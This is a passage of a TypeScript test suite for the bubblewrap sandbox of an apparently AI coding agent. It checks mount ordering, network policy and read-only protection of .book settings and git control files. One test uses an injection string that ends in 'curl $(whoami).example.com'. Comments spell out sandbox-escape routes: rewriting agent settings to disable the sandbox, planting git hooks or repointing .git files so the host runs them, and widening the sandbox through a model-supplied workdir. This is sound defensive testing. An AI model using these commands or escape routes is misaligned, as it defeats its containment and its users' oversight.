import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { execFileSync } from 'child_process';
import {
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  renameSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'fs';
import { homedir, tmpdir } from 'os';
import { basename, join, posix, resolve, win32 } from 'path';
import {
  buildSandboxExecution,
  createSandbox,
  decideSandboxExecution,
  describeControlPathRefusal,
  matchesExcludedCommand,
  protectedWorkspacePaths,
  readCoreHooksPaths,
  readGitConfigIncludes,
  realSandboxHost,
  sandboxBackendAvailable,
  sandboxCoverage,
  sandboxPolicySummary,
  unbindablePaths,
  unsandboxedRefusalMessage,
  withGitConfigReadOnlyNotice,
  type SandboxEntryKind,
  type SandboxHost,
} from './sandbox.js';
import { DEFAULT_SETTINGS, type ResolvedSettings } from './settings.js';

type SandboxTestOverrides = Partial<Omit<ResolvedSettings['sandbox'], 'filesystem' | 'network'>> & {
  filesystem?: Partial<ResolvedSettings['sandbox']['filesystem']>;
  network?: Partial<ResolvedSettings['sandbox']['network']>;
};

function sandboxSettings(overrides: SandboxTestOverrides = {}): ResolvedSettings['sandbox'] {
  const base = structuredClone(DEFAULT_SETTINGS.sandbox) as ResolvedSettings['sandbox'];
  return {
    ...base,
    enabled: true,
    ...overrides,
    filesystem: { ...base.filesystem, ...overrides.filesystem },
    network: { ...base.network, ...overrides.network },
  };
}

/** The system directories `buildSandboxExecution` binds read-only, named literally. */
const SYSTEM_MOUNTS = ['/usr', '/lib', '/lib64', '/bin', '/sbin', '/etc', '/opt'];

/**
 * A fully injected host on which every path "exists": the generated argv
 * depends only on the code under test, never on which system directories the
 * machine running the suite happens to have. Without this, an assertion that
 * `/usr` is bound holds on Linux and silently asserts on an empty bind list on
 * Windows CI, where `resolve('/usr')` lands on `C:\usr` and nothing is there.
 */
function allExistingHost(flavour: typeof posix | typeof win32): SandboxHost {
  return {
    path: flavour,
    exists: () => true,
    isDirectory: () => true,
    readFile: () => null,
    readDir: () => [],
    entryKind: () => 'directory',
    linkTarget: () => null,
    realpath: (at: string) => at,
    fileSize: () => 0,
    homedir: () => (flavour === win32 ? 'C:\\Users\\book' : '/home/book'),
  };
}

describe('buildSandboxExecution', () => {
  it('passes the command as a single argv element so no outer shell can parse it', () => {
    const command = 'echo hi; touch /tmp/escaped && curl $(whoami).example.com';
    const exec = buildSandboxExecution('/usr/bin/bwrap', command, '/work', sandboxSettings());

    expect(exec.file).toBe('/usr/bin/bwrap');
    // Everything the user wrote lives in exactly one element, at the end.
    expect(exec.args.at(-1)).toBe(command);
    expect(exec.args.filter((arg) => arg.includes(';'))).toEqual([command]);
    expect(exec.args.slice(-3)).toEqual(['/bin/bash', '-c', command]);
    expect(exec.args.at(-4)).toBe('--');
  });

  it('binds the workspace after the /tmp tmpfs so a workspace under /tmp survives', () => {
    const dir = mkdtempSync(join(tmpdir(), 'book-sbx-order-'));
    try {
      const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', dir, sandboxSettings());
      const tmpfsIndex = exec.args.indexOf('--tmpfs');
      const bindIndex = exec.args.indexOf(dir);
      expect(tmpfsIndex).toBeGreaterThan(-1);
      expect(bindIndex).toBeGreaterThan(tmpfsIndex);
      expect(exec.args[bindIndex - 1]).toBe('--bind');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it.each([
    { flavourName: 'posix', flavour: posix, workspace: '/work' },
    { flavourName: 'win32', flavour: win32, workspace: 'C:\\work' },
  ])(
    'binds the workspace after the system read-only mounts ($flavourName paths)',
    ({ flavour, workspace }) => {
      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        workspace,
        sandboxSettings(),
        allExistingHost(flavour),
      );
      // The system mounts are the ones named literally, and they must precede
      // the writable workspace bind or a workspace under /usr would be
      // shadowed. The workspace control files are the deliberate exception and
      // come after; they are asserted in their own suite below.
      const systemSources = new Set(SYSTEM_MOUNTS.map((dir) => flavour.resolve(dir)));
      const systemBind = exec.args.findIndex(
        (arg, index) => arg === '--ro-bind' && systemSources.has(exec.args[index + 1]),
      );
      // Found by what it binds rather than by being the last `--bind`: a git
      // directory is pinned with one after this point, and it is the *workspace*
      // that has to come after the system mounts.
      const bindIndex = exec.args.findIndex(
        (arg, index) => arg === '--bind' && exec.args[index + 1] === flavour.resolve(workspace),
      );
      // Both mounts must actually be present before their order means anything:
      // -1 > -1 would vacuously "order" two lookups that found nothing.
      expect(systemBind).toBeGreaterThan(-1);
      expect(bindIndex).toBeGreaterThan(systemBind);
    },
  );

  it('still binds the workspace when no POSIX system mount exists (the Windows host shape)', () => {
    // A Windows host is exactly this: /usr, /lib, … resolve onto the current
    // drive and none exist, so every system read-only bind is skipped. The
    // workspace bind must survive that on its own.
    const workspace = 'C:\\work';
    const host: SandboxHost = {
      ...allExistingHost(win32),
      exists: (path) => path === workspace,
    };
    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      workspace,
      sandboxSettings(),
      host,
    );
    // No *system* read-only mount, which is what this host shape means. The
    // control files still produce their own (the git directory this host claims
    // exists is pinned and its hooks bound), and they are not what this is about.
    const systemSources = new Set(SYSTEM_MOUNTS.map((dir) => win32.resolve(dir)));
    expect(
      exec.args.findIndex(
        (arg, index) => arg === '--ro-bind' && systemSources.has(exec.args[index + 1]),
      ),
    ).toBe(-1);
    const bindIndex = exec.args.indexOf('--bind');
    expect(bindIndex).toBeGreaterThan(-1);
    expect(exec.args.slice(bindIndex, bindIndex + 3)).toEqual(['--bind', workspace, workspace]);
  });

  it('shares the network only when no domain policy is declared', () => {
    const open = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', sandboxSettings());
    expect(open.args).toContain('--share-net');
    expect(open.args).not.toContain('--unshare-net');
  });

  it('fails closed to no network when a per-domain policy is declared', () => {
    // bubblewrap has no DNS or domain awareness, so an allow-list cannot be
    // honoured as written; handing over the full host network would be worse.
    const settings = sandboxSettings();
    settings.network.allowedDomains = ['github.com'];
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', settings);
    expect(exec.args).toContain('--unshare-net');
    expect(exec.args).not.toContain('--share-net');

    const denied = sandboxSettings();
    denied.network.deniedDomains = ['evil.example'];
    expect(buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', denied).args).toContain(
      '--unshare-net',
    );
  });

  it('applies declared filesystem policy after the workspace bind', () => {
    const writable = mkdtempSync(join(tmpdir(), 'book-sbx-rw-'));
    const readonly = mkdtempSync(join(tmpdir(), 'book-sbx-ro-'));
    const masked = mkdtempSync(join(tmpdir(), 'book-sbx-hide-'));
    try {
      const settings = sandboxSettings();
      settings.filesystem.allowWrite = [writable];
      settings.filesystem.denyWrite = [readonly];
      settings.filesystem.denyRead = [masked];
      const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', settings);

      expect(exec.args[exec.args.indexOf(writable) - 1]).toBe('--bind');
      expect(exec.args[exec.args.indexOf(readonly) - 1]).toBe('--ro-bind');
      expect(exec.args[exec.args.indexOf(masked) - 1]).toBe('--tmpfs');
    } finally {
      for (const dir of [writable, readonly, masked]) {
        rmSync(dir, { recursive: true, force: true });
      }
    }
  });

  it('skips bind sources that do not exist, which bwrap would reject', () => {
    const settings = sandboxSettings();
    settings.filesystem.allowWrite = ['/definitely/not/a/real/path'];
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', settings);
    expect(exec.args).not.toContain('/definitely/not/a/real/path');
  });

  it('drops capabilities and ties the sandbox lifetime to the spawning process', () => {
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', sandboxSettings());
    expect(exec.args.join(' ')).toContain('--cap-drop ALL');
    expect(exec.args).toContain('--die-with-parent');
  });

  it('never uses --new-session, which would break every process-group kill', () => {
    // bwrap calls setsid() under --new-session, moving the sandboxed tree out
    // of the process group Node created with `detached: true`. KillShell, the
    // foreground timeout, and Ctrl-C all signal that group and confirm death
    // with kill(-pgid, 0), so the group would read as empty while the command
    // kept running.
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', sandboxSettings());
    expect(exec.args).not.toContain('--new-session');
  });

  it('masks a denied file with /dev/null instead of a tmpfs that would abort bwrap', () => {
    // --tmpfs mkdirs its target, so pointing it at a file fails the whole
    // invocation with "Not a directory" — and a credentials file is the most
    // natural thing to put in denyRead.
    const dir = mkdtempSync(join(tmpdir(), 'book-sbx-file-'));
    const file = join(dir, 'creds.txt');
    writeFileSync(file, 'secret');
    try {
      const settings = sandboxSettings();
      settings.filesystem.denyRead = [file, dir];
      const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', settings);

      const fileIndex = exec.args.indexOf(file);
      expect(exec.args[fileIndex - 1]).toBe('/dev/null');
      expect(exec.args[fileIndex - 2]).toBe('--ro-bind');
      // A directory still gets the tmpfs mask.
      expect(exec.args[exec.args.indexOf(dir) - 1]).toBe('--tmpfs');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });

  it('expands ~ in configured filesystem paths', () => {
    const settings = sandboxSettings();
    settings.filesystem.denyWrite = ['~'];
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', settings);
    // Without expansion this resolves to "<cwd>/~", which does not exist and
    // would be dropped — unenforced policy the user believes is active.
    expect(exec.args).toContain(homedir());
    expect(exec.args).not.toContain(resolve('~'));
  });

  it('binds the workspace root, never a caller-supplied working directory', () => {
    // `workdir` is a model-supplied Bash argument. Binding it would let the
    // model widen its own sandbox: `--bind / /` emitted last shadows every
    // other mount and returns the whole host filesystem, read-write.
    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', '/work', sandboxSettings());
    expect(exec.args.filter((arg) => arg === '/')).toHaveLength(0);
  });
});

/**
 * The workspace bind is read-write, which made every workspace control file
 * writable from inside the sandbox: a sandboxed command could write
 * `.book/settings.local.json` (honoured on the host from the next session — it
 * can disable the sandbox or add `Bash(*)`), drop a `.git/hooks/*` script, or
 * point `core.hooksPath` / `core.fsmonitor` in `.git/config`, all of which the
 * *host* runs afterwards. The file tools already refuse `.book/settings.local.json`
 * (permissions.ts); the sandbox did not (#373).
 */
describe('buildSandboxExecution workspace control files', () => {
  const WORKSPACE = '/work';

  /**
   * A host whose filesystem is a declared set of paths, so each case is about
   * the mount the code emits rather than about a temp directory on this machine.
   */
  function hostWith(
    paths: Record<string, 'dir' | 'file' | 'symlink'>,
    files: Record<string, string> = {},
    links: Record<string, string> = {},
  ) {
    const real = new Set(Object.keys(paths));
    const resolvePath = (p: string): string => {
      const segments = p.split('/').filter(Boolean);
      let current = p.startsWith('/') ? '/' : '';
      for (const segment of segments) {
        current = posix.join(current, segment);
        let hops = 0;
        while (links[current] && hops++ < 10) {
          const target = links[current];
          current = posix.isAbsolute(target)
            ? target
            : posix.resolve(posix.dirname(current), target);
        }
      }
      return current;
    };
    const kind = (path: string): SandboxEntryKind | null => {
      const direct = paths[path];
      if (direct) return direct === 'dir' ? 'directory' : direct;
      const resolved = resolvePath(path);
      const target = paths[resolved];
      return target === 'dir' ? 'directory' : (target ?? null);
    };
    return {
      path: posix,
      exists: (path: string) => real.has(path) || real.has(resolvePath(path)),
      isDirectory: (path: string) => paths[path] === 'dir' || paths[resolvePath(path)] === 'dir',
      homedir: () => '/home/book',
      readFile: (path: string) => files[path] ?? files[resolvePath(path)] ?? null,
      // A declared tree has no listings of its own; entry names are the
      // declared children of a directory, which is all the git-dir walk reads.
      readDir: (path: string) => {
        const resolved = resolvePath(path);
        const candidates = new Set<string>();
        for (const candidate of real) {
          if (posix.dirname(candidate) === path || posix.dirname(candidate) === resolved) {
            candidates.add(posix.basename(candidate));
          }
        }
        return [...candidates];
      },
      entryKind: kind,
      linkTarget: (path: string) => links[path] ?? null,
      realpath: (path: string) => {
        const target = resolvePath(path);
        return real.has(target) ? target : null;
      },
      // The declared content stands in for the file on disk, so a config past
      // the read cap is declared at its real size.
      fileSize: (path: string) => (files[path] ?? files[resolvePath(path)] ?? '').length || null,
    } satisfies SandboxHost;
  }

  function mountsFor(args: string[], target: string): { flag: string; index: number } {
    const index = args.indexOf(target);
    return { flag: index === -1 ? '' : args[index - 1], index };
  }

  /**
   * The last mount of `target`, for a path the namespace mounts more than once.
   *
   * The later one is the one in force: a protected path is bound read-only and
   * then, if the user asked for it, bound read-write over the top.
   */
  function lastMountFor(args: string[], target: string): { flag: string; index: number } {
    let found = { flag: '', index: -1 };
    args.forEach((arg, index) => {
      if (arg.startsWith('-') && args[index + 1] === target) found = { flag: arg, index };
    });
    return found;
  }

  it('mounts an existing .book read-only after the workspace and any allowWrite bind', () => {
    const host = hostWith({
      '/work': 'dir',
      '/work/.book': 'dir',
      '/work/extra': 'dir',
      '/work/.git': 'dir',
      '/work/.git/hooks': 'dir',
      '/work/.git/config': 'file',
    });
    const settings = sandboxSettings();
    settings.filesystem.allowWrite = ['/work/extra'];

    const exec = buildSandboxExecution('/usr/bin/bwrap', 'true', WORKSPACE, settings, host);

    const book = mountsFor(exec.args, '/work/.book');
    expect(exec.args.slice(book.index - 1, book.index + 2)).toEqual([
      '--ro-bind',
      '/work/.book',
      '/work/.book',
    ]);
    // After the workspace bind, or the workspace would shadow it.
    expect(exec.args.lastIndexOf('--bind', book.index)).toBeLessThan(book.index);
    // After `allowWrite`, or an extra writable root would reopen it.
    expect(exec.args.indexOf('/work/extra')).toBeLessThan(book.index);
    // Before the configured deny policy, which stays free to be stricter.
    expect(book.index).toBeLessThan(exec.args.indexOf('--share-net'));
  });

  it('mounts an absent .book as an empty read-only directory so it cannot be created', () => {
    const host = hostWith({ '/work': 'dir' });

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    const bookIndex = exec.args.indexOf('/work/.book');
    expect(exec.args.slice(bookIndex - 1, bookIndex + 3)).toEqual([
      '--tmpfs',
      '/work/.book',
      '--remount-ro',
      '/work/.book',
    ]);
  });

  it('binds a git directory read-only by default, and per-file paths when git may write', () => {
    // Read-only is the default now (issue 373): a writable git dir let a
    // sandboxed command create `.git/commondir`, and the host's git read it on
    // its next command.
    const host = hostWith({
      '/work': 'dir',
      '/work/.book': 'dir',
      '/work/.git': 'dir',
      '/work/.git/hooks': 'dir',
      '/work/.git/config': 'file',
    });

    const roExec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    // The whole directory, not a self-bind of it that stays writable.
    const git = mountsFor(roExec.args, '/work/.git');
    expect(roExec.args.slice(git.index - 1, git.index + 2)).toEqual([
      '--ro-bind',
      '/work/.git',
      '/work/.git',
    ]);
    // Nothing else inside it: the ro-bind is the protection, and there is no
    // per-file mount to shadow or reopen. Only the single ro-bind of `.git`
    // itself mentions the path at all.
    expect(
      roExec.args.filter((arg) => arg === '/work/.git' || arg.startsWith('/work/.git/')),
    ).toEqual(['/work/.git', '/work/.git']);

    // Opting git writes back on restores the per-file protection.
    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings({ filesystem: { allowGitWrites: true } }),
      host,
    );

    expect(mountsFor(exec.args, '/work/.git/hooks').flag).toBe('--ro-bind');
    expect(mountsFor(exec.args, '/work/.git/config').flag).toBe('--ro-bind');
    // An absent config is not mounted: there is nothing to protect, and bwrap
    // aborts the whole invocation on a missing bind source.
    expect(exec.args).not.toContain('/work/.git/config.worktree');
  });

  it('emits no git-dir mask when hooks are absent and git directories are read-only', () => {
    // A `--tmpfs` under a ro-bind mount point would ask bwrap to mkdir through
    // a read-only mount, which aborts the whole invocation. The whole-dir bind
    // already stops the creation, so no mask is wanted either.
    const absentHost = hostWith({ '/work': 'dir', '/work/.book': 'dir', '/work/.git': 'dir' });

    const roExec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      absentHost,
    );

    expect(roExec.args).not.toContain('/work/.git/hooks/');

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings({ filesystem: { allowGitWrites: true } }),
      absentHost,
    );

    const hooksIndex = exec.args.indexOf('/work/.git/hooks');
    expect(exec.args.slice(hooksIndex - 1, hooksIndex + 2)).toEqual([
      '--tmpfs',
      '/work/.git/hooks',
      '--remount-ro',
    ]);
  });

  it('follows a .git file to the git dir inside the workspace, and its commondir', () => {
    const host = hostWith(
      {
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.git': 'file',
        '/work/.git-data': 'dir',
        '/work/.git-data/hooks': 'dir',
        '/work/.git-data/config.worktree': 'file',
        '/work/.git-shared': 'dir',
        '/work/.git-shared/hooks': 'dir',
        '/work/.git-shared/config': 'file',
      },
      {
        '/work/.git': 'gitdir: .git-data\n',
        // commondir is relative to the git dir, not to the workspace.
        '/work/.git-data/commondir': '../.git-shared\n',
      },
    );

    // Both discovered git dirs are bound read-only, and the `.git` file itself
    // is read-only too, which is what stops the pointer being rewritten.
    const roExec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    for (const target of ['/work/.git-data', '/work/.git-shared']) {
      expect(mountsFor(roExec.args, target).flag, target).toBe('--ro-bind');
    }
    expect(mountsFor(roExec.args, '/work/.git').flag).toBe('--ro-bind');

    // Opting git writes back on restores file-level protection only.
    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings({ filesystem: { allowGitWrites: true } }),
      host,
    );

    for (const target of [
      '/work/.git-data/hooks',
      '/work/.git-data/config.worktree',
      '/work/.git-shared/hooks',
      '/work/.git-shared/config',
    ]) {
      expect(mountsFor(exec.args, target).flag, target).toBe('--ro-bind');
    }
  });

  it('does not touch a git dir that lies outside the workspace', () => {
    // Nothing binds it writable, so there is nothing to protect — and mounting
    // it would hand a worktree's hooks to a command that has no other business
    // seeing the parent repository.
    const host = hostWith(
      {
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.git': 'file',
        '/elsewhere/repo.git': 'dir',
        '/elsewhere/repo.git/hooks': 'dir',
        '/elsewhere/repo.git/config': 'file',
      },
      { '/work/.git': 'gitdir: /elsewhere/repo.git\n' },
    );

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    expect(exec.args.join(' ')).not.toContain('/elsewhere/repo.git');
    // The `.git` file itself is still a control file the host reads, so it is
    // read-only: a command that could rewrite it would point the host's git at a
    // repository it built, whose hooks and config it then owns (#373).
    expect(mountsFor(exec.args, '/work/.git').flag).toBe('--ro-bind');
  });

  it('resolves a relative gitdir against the workspace, as git does', () => {
    const host = hostWith(
      {
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.git': 'file',
        '/work/nested/gitdir': 'dir',
        '/work/nested/gitdir/hooks': 'dir',
      },
      { '/work/.git': 'gitdir: nested/gitdir' },
    );

    const roExec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    expect(mountsFor(roExec.args, '/work/nested/gitdir').flag).toBe('--ro-bind');

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings({ filesystem: { allowGitWrites: true } }),
      host,
    );

    expect(mountsFor(exec.args, '/work/nested/gitdir/hooks').flag).toBe('--ro-bind');
  });

  it('mounts no git metadata when the workspace is not a repository', () => {
    const host = hostWith({ '/work': 'dir', '/work/.book': 'dir' });

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    expect(exec.args.join(' ')).not.toContain('.git');
  });

  it('ignores a .git file it cannot parse', () => {
    const host = hostWith(
      { '/work': 'dir', '/work/.book': 'dir', '/work/.git': 'file' },
      { '/work/.git': 'not a gitdir line\n' },
    );

    const exec = buildSandboxExecution(
      '/usr/bin/bwrap',
      'true',
      WORKSPACE,
      sandboxSettings(),
      host,
    );

    // The file itself is read-only, but no git directory is taken from it.
    expect(exec.args.join(' ')).not.toContain('.git/');
  });

  /**
   * Read-only *children* of a git dir were not enough, because the file that
   * *selects* the git dir stayed writable: a sandboxed command repointed `.git`
   * or `commondir` at a repository it built, planted hooks and `core.hooksPath`
   * there, and the host's next `git commit` ran them. Every case below was
   * reproduced against a real bubblewrap (see the real-sandbox suite).
   */
  describe('git pointer files', () => {
    const gitWriteSettings = () => sandboxSettings({ filesystem: { allowGitWrites: true } });

    it('pins the top-level git dir as a mount point only when git may write', () => {
      // rename(2) on a path that is not a mount point succeeds, so a read-only
      // `hooks/` inside a writable `.git` is not protection: `mv .git .git.old`
      // moves the whole thing, hook and all, and a fresh writable one takes its
      // place. `--bind <dir> <dir>` is what makes the rename EBUSY. By default
      // the git dir is a mount point through its own `--ro-bind` instead, which
      // refuses the rename and every write the pin used to allow.
      const host = hostWith({
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.git': 'dir',
        '/work/.git/hooks': 'dir',
        '/work/.git/config': 'file',
      });

      const roExec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      const ro = mountsFor(roExec.args, '/work/.git');
      expect(roExec.args.slice(ro.index - 1, ro.index + 2)).toEqual([
        '--ro-bind',
        '/work/.git',
        '/work/.git',
      ]);
      expect(protectedWorkspacePaths(WORKSPACE, host).pinnedDirectories).toEqual([]);

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        gitWriteSettings(),
        host,
      );

      const pin = mountsFor(exec.args, '/work/.git');
      expect(exec.args.slice(pin.index - 1, pin.index + 2)).toEqual([
        '--bind',
        '/work/.git',
        '/work/.git',
      ]);
      // Writable, so a sandboxed `git commit` still works...
      expect(pin.flag).toBe('--bind');
      // ...and before the read-only children, which are mounted into it.
      expect(pin.index).toBeLessThan(mountsFor(exec.args, '/work/.git/hooks').index);
      expect(pin.index).toBeLessThan(mountsFor(exec.args, '/work/.git/config').index);
      // And after the workspace bind, which it lives inside.
      const workspace = exec.args.findIndex(
        (arg, index) => arg === '--bind' && exec.args[index + 1] === WORKSPACE,
      );
      expect(workspace).toBeGreaterThan(-1);
      expect(workspace).toBeLessThan(pin.index);
    });

    it('binds the git directory at the root as given when workspace root is a symlink', () => {
      // The sandbox binds the workspace at the root as given (`--bind <root> <root>`),
      // so the read-only git dir bind must be emitted at `root + relative(canonicalPath(root), canonicalPath(dir))`
      // to land inside the workspace view instead of at the canonical path outside it.
      const host = hostWith(
        {
          '/mnt/data/project': 'dir',
          '/mnt/data/project/.book': 'dir',
          '/mnt/data/project/.git': 'dir',
          '/mnt/data/project/.git/hooks': 'dir',
          '/mnt/data/project/.git/config': 'file',
          '/home/book/link': 'symlink',
        },
        {},
        { '/home/book/link': '/mnt/data/project' },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        '/home/book/link',
        sandboxSettings(),
        host,
      );

      // Workspace bound at root as given:
      expect(mountsFor(exec.args, '/home/book/link').flag).toBe('--bind');
      // Git directory bound inside the workspace path the sandbox sees:
      expect(mountsFor(exec.args, '/home/book/link/.git').flag).toBe('--ro-bind');
      // Not at the canonical path that would fall outside the sandbox view:
      expect(exec.args).not.toContain('/mnt/data/project/.git');
    });

    it('protects the commondir and gitdir pointer files a linked worktree writes', () => {
      // `.git/worktrees/<wt>/commondir` names the shared git dir, and
      // `.git/worktrees/<wt>/gitdir` names the work tree. Either rewritten, the
      // host's git is pointed at a git dir the command built.
      const host = hostWith({
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.git': 'dir',
        '/work/.git/hooks': 'dir',
        '/work/.git/config': 'file',
        '/work/.git/worktrees/wt': 'dir',
        '/work/.git/worktrees/wt/hooks': 'dir',
        '/work/.git/worktrees/wt/config.worktree': 'file',
        '/work/.git/worktrees/wt/commondir': 'file',
        '/work/.git/worktrees/wt/gitdir': 'file',
      });

      // Read-only by default: the whole git dir is bound, `commondir` included,
      // so neither pointer can be rewritten or even created (#373).
      const roExec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      expect(mountsFor(roExec.args, '/work/.git').flag).toBe('--ro-bind');
      expect(mountsFor(roExec.args, '/work/.git/worktrees/wt/commondir').index).toBe(-1);
      expect(mountsFor(roExec.args, '/work/.git/worktrees/wt/gitdir').index).toBe(-1);

      // With git writes opted back on, the pointers are protected file by file.
      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        gitWriteSettings(),
        host,
      );

      for (const target of [
        '/work/.git/worktrees/wt/hooks',
        '/work/.git/worktrees/wt/config.worktree',
        '/work/.git/worktrees/wt/commondir',
        '/work/.git/worktrees/wt/gitdir',
      ]) {
        expect(mountsFor(exec.args, target).flag, target).toBe('--ro-bind');
      }
    });

    it('protects a submodule git dir, and the modules of a submodule', () => {
      // `.git/modules/<sub>` is a git dir in its own right, and it was never
      // mounted at all: a hook planted in it ran on the host's next
      // `git -C sub commit`. A submodule of a submodule nests again, so the walk
      // is not one level deep.
      const host = hostWith({
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.git': 'dir',
        '/work/.git/hooks': 'dir',
        '/work/.git/modules/sub': 'dir',
        '/work/.git/modules/sub/hooks': 'dir',
        '/work/.git/modules/sub/config': 'file',
        '/work/.git/modules/sub/modules/deep': 'dir',
        '/work/.git/modules/sub/modules/deep/hooks': 'dir',
        '/work/.git/modules/sub/modules/deep/config': 'file',
      });

      // Read-only by default: the top git dir's bind covers `modules/sub` and
      // everything under it, and no redundant mount is emitted inside it.
      const roExec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );

      expect(mountsFor(roExec.args, '/work/.git').flag).toBe('--ro-bind');
      expect(mountsFor(roExec.args, '/work/.git/modules/sub').index).toBe(-1);

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        gitWriteSettings(),
        host,
      );

      for (const target of [
        '/work/.git/modules/sub/hooks',
        '/work/.git/modules/sub/config',
        '/work/.git/modules/sub/modules/deep/hooks',
        '/work/.git/modules/sub/modules/deep/config',
      ]) {
        expect(mountsFor(exec.args, target).flag, target).toBe('--ro-bind');
      }
    });

    /**
     * A submodule's work tree carries its own one-line `.git` file, and only the
     * workspace *root* one used to be read-only. Rewriting `sub/.git` to
     * `gitdir: ../evil` therefore passed unnoticed, and the host's next
     * `git -C sub commit` ran a hook in a repository the command had built.
     */
    it('protects the .git pointer file of every work tree inside the workspace', () => {
      const host = hostWith(
        {
          '/work': 'dir',
          '/work/.book': 'dir',
          '/work/.git': 'dir',
          '/work/.git/hooks': 'dir',
          '/work/.git/config': 'file',
          '/work/.git/modules/sub': 'dir',
          '/work/.git/modules/sub/hooks': 'dir',
          '/work/.git/modules/sub/config': 'file',
          '/work/sub': 'dir',
          '/work/sub/.git': 'file',
          '/work/.git/worktrees/wt': 'dir',
          '/work/.git/worktrees/wt/gitdir': 'file',
          '/work/wt/.git': 'file',
        },
        {
          '/work/sub/.git': 'gitdir: ../.git/modules/sub\n',
          '/work/.git/worktrees/wt/gitdir': '/work/wt/.git\n',
        },
      );

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        gitWriteSettings(),
        host,
      );

      for (const target of ['/work/sub/.git', '/work/wt/.git']) {
        expect(mountsFor(exec.args, target).flag, target).toBe('--ro-bind');
      }
      // Read-only by default too, through the same pointer protection.
      const roExec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );
      for (const target of ['/work/sub/.git', '/work/wt/.git']) {
        expect(mountsFor(roExec.args, target).flag, target).toBe('--ro-bind');
      }
      expect(mountsFor(roExec.args, '/work/.git').flag).toBe('--ro-bind');
    });

    /**
     * `git submodule add url libs/deep` puts the git dir at
     * `.git/modules/libs/deep`, where `libs` holds nothing but `modules/`. The
     * walk treated `libs` as the git dir and never reached `deep`, so neither
     * its config nor its hooks were protected.
     */
    it('reaches a git dir under a multi-segment modules container', () => {
      const host = hostWith({
        '/work': 'dir',
        '/work/.book': 'dir',
        '/work/.git': 'dir',
        '/work/.git/hooks': 'dir',
        // A container: `git submodule add url libs/deep` puts the git dir at
        // `modules/libs/deep`, and `modules/libs` has no HEAD and no config.
        '/work/.git/modules/libs': 'dir',
        '/work/.git/modules/libs/deep': 'dir',
        '/work/.git/modules/libs/deep/hooks': 'dir',
        '/work/.git/modules/libs/deep/config': 'file',
        '/work/libs': 'dir',
        '/work/libs/deep': 'dir',
        '/work/libs/deep/.git': 'file',
      });

      const exec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        gitWriteSettings(),
        host,
      );

      for (const target of [
        '/work/.git/modules/libs/deep/hooks',
        '/work/.git/modules/libs/deep/config',
        '/work/libs/deep/.git',
      ]) {
        expect(mountsFor(exec.args, target).flag, target).toBe('--ro-bind');
      }
      // Read-only by default, through the container git dir's whole-dir bind.
      const roExec = buildSandboxExecution(
        '/usr/bin/bwrap',
        'true',
        WORKSPACE,
        sandboxSettings(),
        host,
      );
      expect(mountsFor(roExec.args, '/work/.git').flag).toBe('--ro-bind');
      for (const target of [
        '/work/.git/modules/libs/deep/hooks',
        '/work/.git/modules/libs/deep/config',
      ]) {
        expect(mountsFor(roExec.args, target).index, target).toBe(-1);
      }
      expect(mountsFor(roExec.args, '/work/libs/deep/.git').flag).toBe('--ro-bind');
    });

    /**
     * Every discovered git dir used to be pinned with a writable self-bind, and
